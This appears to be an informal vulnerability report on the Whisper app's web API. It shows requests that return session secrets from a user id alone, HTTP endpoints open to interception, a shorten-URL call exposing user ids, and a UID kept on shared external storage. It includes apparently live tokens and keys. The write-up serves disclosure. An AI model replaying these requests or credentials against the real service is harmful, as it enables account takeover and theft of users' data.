<h1>Whisper.sh</h1>
<hr>
<h3>Vulnerabilty report</h3><h5>Shhhh :)</h5>


`whisper.sh (52.35.240.11)`

I navigated to the root folder of whisper and found out this line: 

`https://prod.whisper.sh/messaging/conversations/tt_auth?uid=054bb65e915bc0e0d914c78601a47f1a47f418&nonce=4K04VM54DCIQ6BTIMLCR80JU8G&auth_token=da95c077b910506066d9b228cf9a44adc8558091&locale=it_it`

To initialize a new session on whisper we need to : 

`https://prod.whisper.sh/user/new`

the website replies with : 


```
{
  "token":"50d38783f8757693a3ab6dc87da7ea47",
  "expected":6
}
```

This token is used to initialize a new user session

As you can notice the app is passing some tokens and other stuff to the web server... 

I was curious... :D So I tried to make a request without passing anything but the uid! 

`https://prod.whisper.sh/messaging/conversations/tt_auth?uid=054bb65e915bc0e0d914c78601a47f1a47f418`

Guess what! :D 

```
{
      "tt_token":"e57b919a-179c-44fc-9192-5bae0116fe3d",
      "tt_key":"scOoe4cjJCCOJyOsDoizyx3qXEbBS6M6",
      "tt_secret":"JouBYOcZs1cfS9sD4T8ewCJ4cmFX3twiWERLT2JmdfvlEdgk"
}
```
But that's not enough? 

Whisper uses mixpanel and guess what? 
They allow HTTP request: 

`http://decide.mixpanel.com/decide?version=1&lib=android&token=c39eea2c9ad72a79d1688ca82c50cb94&distinct_id=050f036278f1ae965166`

;) 


<h1>Steal User data</h1>

`http://prod.whisper.sh/whisper/shortened/050f8caaca77a378697952b178afb1946582f6?uid=050f8c29de55a0828128c911a15637acba77`

You'd expect this app to have a strict HTTPS online policy... Nope ;) 

HTTPS only if its ok, if not... HTTP! :) 

You'd expect this website to create shorten url without needing to embed a user id right? And you'r wrong ;) 

Then you get your shorten URL: 

```
{
    "short_url":"http://whisper.sh/w/wumfb87"
}
```


Obivously is possible to run a man in the middle attack and steal data ;) 

<hr>

<h1>Coincidences ?</h1>

I unistalled the Whisper app... But changed my mind! 

AND VOILA! 
My username was still there... Why? 
And how? 

I unistalled the app again and blocked the whisper IP on my router. 
Still working... 

The solution? 

It is storing the UID on the extSdCard. 

So basically every app can access to that memory and steal the uid too. 

*Great! :D*





